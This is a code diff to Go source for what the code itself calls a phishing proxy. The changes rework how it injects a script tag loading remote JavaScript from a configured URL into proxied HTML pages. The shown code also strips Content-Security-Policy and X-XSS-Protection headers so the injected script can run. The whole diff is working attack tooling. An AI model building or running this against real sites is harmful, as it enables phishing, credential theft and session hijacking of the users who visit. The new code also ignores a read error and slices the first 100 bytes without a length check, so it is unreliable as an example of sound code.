@@ -11,7 +11,6 @@ import (
 	"net/url"
 	"strings"
 
-	"github.com/PuerkitoBio/goquery"
 	"github.com/valyala/bytebufferpool"
 )
 
@@ -87,6 +86,7 @@ func (p *phishingProxy) ModifyResponse(response *http.Response) error {
 	// Stop CSPs and anti-XSS headers from ruining our fun
 	response.Header.Del("Content-Security-Policy")
 	response.Header.Del("X-XSS-Protection")
+
 	return nil
 }
 
@@ -107,28 +107,23 @@ func (p *phishingProxy) modifyLocationHeader(response *http.Response) error {
 }
 
 func (p *phishingProxy) injectJavascript(response *http.Response) error {
-	if !strings.Contains(response.Header.Get("Content-Type"), "text/html") {
+	if !strings.Contains(response.Header.Get("Content-Type"), "text/html"){
 		return nil
 	}
 
-	document, err := goquery.NewDocumentFromResponse(response)
-	if err != nil {
-		return err
+	html, _ := ioutil.ReadAll(response.Body)
+	response.Body = ioutil.NopCloser(bytes.NewBuffer(html))
+	if !bytes.Contains(html[:100], []byte("<html")){
+		return nil
 	}
+	payload := fmt.Sprintf("</script><script type='text/javascript' src='%s'></script>", p.JavascriptURL)
+	html = bytes.Replace(html, []byte("</script>"), []byte(payload), 1)
 
-	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", p.JavascriptURL)
-	selection := document.
-		Find("head").
-		AppendHtml(payload).
-		Parent()
-
-	html, err := selection.Html()
-	if err != nil {
-		return err
-	}
-	response.Body = ioutil.NopCloser(bytes.NewBufferString(html))
+	response.Body = ioutil.NopCloser(bytes.NewBuffer(html))
+	response.Header.Set("Content-Length",fmt.Sprint(len(html)))
 	return nil
 }
+
 
 // InterceptingTransport sends the HTTP exchange to the loaded plugins.
 type InterceptingTransport struct {
